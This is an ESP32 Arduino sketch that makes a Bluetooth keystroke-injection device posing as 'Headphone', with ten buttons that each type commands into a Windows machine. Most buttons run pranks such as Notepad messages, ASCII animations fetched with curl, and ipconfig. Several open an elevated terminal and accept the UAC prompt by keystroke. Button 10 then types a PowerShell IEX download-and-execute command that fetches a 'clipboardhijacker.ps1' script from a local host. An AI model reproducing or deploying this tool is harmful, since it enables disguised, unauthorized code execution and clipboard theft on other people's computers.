// This program created by Sachin Kumar Pandey
// ESP32 BLE HID
#include <BleKeyboard.h>

#define BUTTON_1_PIN 16 // Trigger 1
#define BUTTON_2_PIN 17 // Trigger 2
#define BUTTON_3_PIN 18 // Trigger 3
#define BUTTON_4_PIN 19 // Trigger 4
#define BUTTON_5_PIN 21 // Trigger 5 (changed from 20 -> 21; change back if your board supports GPIO20)
#define BUTTON_6_PIN 15 // Trigger 6
#define BUTTON_7_PIN 13 // Trigger 7
#define BUTTON_8_PIN 12 // Trigger 8
#define BUTTON_9_PIN 14 // Trigger 9
#define BUTTON_10_PIN 23  // Trigger 10

char kbd[] = "Headphone"; // Device Name
BleKeyboard bleKeyboard(kbd, "Espressif", 100);

// last-state trackers
bool lastState1 = HIGH;
bool lastState2 = HIGH;
bool lastState3 = HIGH;
bool lastState4 = HIGH;
bool lastState5 = HIGH;
bool lastState6 = HIGH;
bool lastState7 = HIGH;
bool lastState8 = HIGH;
bool lastState9 = HIGH;
bool lastState10 = HIGH;

// helper to type a string char-by-char
void sendString(const char* s, int charDelay = 10) {
  for (size_t i = 0; i < strlen(s); i++) {
    bleKeyboard.print(s[i]);
    delay(charDelay);
  }
}

void openRun() {
  bleKeyboard.press(KEY_LEFT_GUI);
  bleKeyboard.press('r');
  delay(100);
  bleKeyboard.releaseAll();
  delay(300);
}

void setup() {
  Serial.begin(115200);

  pinMode(BUTTON_1_PIN, INPUT_PULLUP);
  pinMode(BUTTON_2_PIN, INPUT_PULLUP);
  pinMode(BUTTON_3_PIN, INPUT_PULLUP);
  pinMode(BUTTON_4_PIN, INPUT_PULLUP);
  pinMode(BUTTON_5_PIN, INPUT_PULLUP);
  pinMode(BUTTON_6_PIN, INPUT_PULLUP);
  pinMode(BUTTON_7_PIN, INPUT_PULLUP);
  pinMode(BUTTON_8_PIN, INPUT_PULLUP);
  pinMode(BUTTON_9_PIN, INPUT_PULLUP);
  pinMode(BUTTON_10_PIN, INPUT_PULLUP);

  bleKeyboard.begin();
}

void loop() {
  if (bleKeyboard.isConnected()) {
    bool state1 = digitalRead(BUTTON_1_PIN);
    bool state2 = digitalRead(BUTTON_2_PIN);
    bool state3 = digitalRead(BUTTON_3_PIN);
    bool state4 = digitalRead(BUTTON_4_PIN);
    bool state5 = digitalRead(BUTTON_5_PIN);
    bool state6 = digitalRead(BUTTON_6_PIN);
    bool state7 = digitalRead(BUTTON_7_PIN);
    bool state8 = digitalRead(BUTTON_8_PIN);
    bool state9 = digitalRead(BUTTON_9_PIN);
    bool state10 = digitalRead(BUTTON_10_PIN);

    // Trigger 1:
    if (lastState1 == HIGH && state1 == LOW) {
      Serial.println("Trigger 1 is running");
      openRun();
      delay(700);
      sendString("notepad");
      delay(100);
      bleKeyboard.press(KEY_RETURN);
      delay(100);
      bleKeyboard.releaseAll();
      delay(800);

      const char* txt = "Hello From ESP32 - This program created by Sachin Kumar Pandey";
      sendString(txt, 50);
      delay(200);
    }

    // Trigger 2:
    if (lastState2 == HIGH && state2 == LOW) {
      openRun();
      delay(500);
      sendString("wt"); // looks like you intended Windows Terminal ("wt")
      delay(100);
      // Ctrl+Shift+Enter to run as admin (may show UAC)
      bleKeyboard.press(KEY_LEFT_CTRL);
      bleKeyboard.press(KEY_LEFT_SHIFT);
      bleKeyboard.press(KEY_RETURN);
      delay(120);
      bleKeyboard.releaseAll();
      delay(3000);

      // navigate and run; your original sequence used LEFT_ARROW etc.
      bleKeyboard.press(KEY_LEFT_ARROW);
      delay(100);
      bleKeyboard.releaseAll();
      delay(100);
      bleKeyboard.press(KEY_RETURN);
      delay(100);
      bleKeyboard.releaseAll();
      delay(2000);

      const char* cmd = "color 2 & curl parrot.live";
      sendString(cmd, 50);
      delay(500);
      bleKeyboard.press(KEY_RETURN);
      delay(100);
      bleKeyboard.releaseAll();
      delay(1000);
    }

    // Trigger 3:
    if (lastState3 == HIGH && state3 == LOW) {
      openRun();
      delay(700);
      const char* url = "https://sachinpandey7709.github.io/Resume-Design/";
      sendString(url, 10);
      delay(300);
      bleKeyboard.press(KEY_RETURN);
      delay(100);
      bleKeyboard.releaseAll();
      delay(1000);
    }

    // Trigger 4:
    if (lastState4 == HIGH && state4 == LOW) {
      openRun();
      delay(300);
      const char* cmd = "cmd";
      sendString(cmd, 10);
      delay(200);
      bleKeyboard.press(KEY_RETURN);
      delay(300);
      bleKeyboard.releaseAll();
      delay(700);

      const char* action = "ipconfig /all";
      sendString(action, 10);
      delay(200);
      bleKeyboard.press(KEY_RETURN);
      delay(100);
      bleKeyboard.releaseAll();
      delay(1000);
    }

    // Trigger 5:
    if (lastState5 == HIGH && state5 == LOW) {
      openRun();
      delay(500);

      const char* url = "https://github.com/sachinpandey7709";
      sendString(url, 10);
      delay(300);
      bleKeyboard.press(KEY_RETURN);
      delay(100);
      bleKeyboard.releaseAll();
      delay(1000);
    }

    // Trigger 6:
    if (lastState6 == HIGH && state6 == LOW) {
      openRun();
      delay(400);
      sendString("cmd", 10);
      delay(150);
      bleKeyboard.press(KEY_RETURN);
      delay(300);
      bleKeyboard.releaseAll();
      delay(700);
      sendString("color a", 10); // foreground bright green
      delay(100);
      bleKeyboard.press(KEY_RETURN);
      delay(200);
      bleKeyboard.releaseAll();
      delay(700);

      sendString("color 1", 10); // foreground blue
      delay(100);
      bleKeyboard.press(KEY_RETURN);
      delay(200);
      bleKeyboard.releaseAll();
      delay(700);

      sendString("color 2", 10); // foreground green
      delay(100);
      bleKeyboard.press(KEY_RETURN);
      delay(200);
      bleKeyboard.releaseAll();
      delay(700);

      // exit cmd
      sendString("exit", 10);
      delay(100);
      bleKeyboard.press(KEY_RETURN);
      delay(100);
      bleKeyboard.releaseAll();
      delay(500);
    }

    // Trigger 7:
    if (lastState7 == HIGH && state7 == LOW) {
      openRun();
      delay(500);
      sendString("wt"); // looks like you intended Windows Terminal ("wt")
      delay(100);
      // Ctrl+Shift+Enter to run as admin (may show UAC)
      bleKeyboard.press(KEY_LEFT_CTRL);
      bleKeyboard.press(KEY_LEFT_SHIFT);
      bleKeyboard.press(KEY_RETURN);
      delay(120);
      bleKeyboard.releaseAll();
      delay(3000);

      // navigate and run; your original sequence used LEFT_ARROW etc.
      bleKeyboard.press(KEY_LEFT_ARROW);
      delay(100);
      bleKeyboard.releaseAll();
      delay(100);
      bleKeyboard.press(KEY_RETURN);
      delay(100);
      bleKeyboard.releaseAll();
      delay(2000);

      const char* cmd = "color 2 & curl ascii.live/forrest";
      sendString(cmd, 50);
      delay(500);
      bleKeyboard.press(KEY_RETURN);
      delay(100);
      bleKeyboard.releaseAll();
      delay(1000);
    }

    // Trigger 8:
    if (lastState8 == HIGH && state8 == LOW) {
      openRun();
      delay(500);
      sendString("wt"); // looks like you intended Windows Terminal ("wt")
      delay(100);
      // Ctrl+Shift+Enter to run as admin (may show UAC)
      bleKeyboard.press(KEY_LEFT_CTRL);
      bleKeyboard.press(KEY_LEFT_SHIFT);
      bleKeyboard.press(KEY_RETURN);
      delay(120);
      bleKeyboard.releaseAll();
      delay(3000);

      // navigate and run; your original sequence used LEFT_ARROW etc.
      bleKeyboard.press(KEY_LEFT_ARROW);
      delay(100);
      bleKeyboard.releaseAll();
      delay(100);
      bleKeyboard.press(KEY_RETURN);
      delay(100);
      bleKeyboard.releaseAll();
      delay(2000);

      const char* cmd = "color 2 & curl ascii.live/donut";
      sendString(cmd, 50);
      delay(500);
      bleKeyboard.press(KEY_RETURN);
      delay(100);
      bleKeyboard.releaseAll();
      delay(1000);
    }

    // Trigger 9
    if (lastState9 == HIGH && state9 == LOW) {
      if (bleKeyboard.isConnected()) {
        // Open Run dialog (Win + R)
        bleKeyboard.press(KEY_LEFT_GUI);
        bleKeyboard.press('r');
        delay(100);
        bleKeyboard.releaseAll();
        delay(1000);

        // Launch Notepad
        const char* cmd = "notepad";
        for (int i = 0; i < strlen(cmd); i++) {
          bleKeyboard.print(cmd[i]);
          delay(10);
        }
        delay(500);
        bleKeyboard.press(KEY_RETURN);
        delay(100);
        bleKeyboard.releaseAll();
        delay(900); // wait for Notepad to open

        // Type a harmless message
        const char* msg = "This is a harmless test message. Please ignore.";
        for (int i = 0; i < strlen(msg); i++) {
          bleKeyboard.print(msg[i]);
          delay(8);
        }
        delay(300);

        // Open File menu (Alt + F)
        bleKeyboard.press(KEY_LEFT_ALT);
        bleKeyboard.press('f');
        delay(100);
        bleKeyboard.releaseAll();
        
        // Wait 300 ms then press 'x' (File -> Exit)
        delay(300);
        bleKeyboard.press('x');
        delay(100);
        bleKeyboard.releaseAll();
      }
    }

    // Trigger 10:
      if (lastState10 == HIGH && state10 == LOW) {
      bleKeyboard.press(KEY_LEFT_GUI);
      bleKeyboard.press('r');
      delay(100);
      bleKeyboard.releaseAll();
      delay(1000);
      bleKeyboard.print("wt");
      delay(100);
      bleKeyboard.press(KEY_LEFT_CTRL);
      bleKeyboard.press(KEY_LEFT_SHIFT);
      bleKeyboard.press(KEY_RETURN);
      delay(100);
      bleKeyboard.releaseAll();
      delay(3000);
      bleKeyboard.press(KEY_LEFT_ARROW);
      delay(100);
      bleKeyboard.releaseAll();
      delay(100);
      bleKeyboard.press(KEY_RETURN);
      delay(100);
      bleKeyboard.releaseAll();
      delay(5000);
      const char* cmd = "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.53:8081/clipboardhijacker.ps1')";
      for (int i=0; i < strlen(cmd); i++) {
      bleKeyboard.print(cmd[i]);
      delay(50);
      }
      delay(1000);
      bleKeyboard.press(KEY_RETURN);
      delay(100);
      bleKeyboard.releaseAll();
      delay(1000);
      }

    // update last states
    lastState1 = state1;
    lastState2 = state2;
    lastState3 = state3;
    lastState4 = state4;
    lastState5 = state5;
    lastState6 = state6;
    lastState7 = state7;
    lastState8 = state8;
    lastState9 = state9;
    lastState10 = state10;
  }

  delay(10); // Small debounce
}
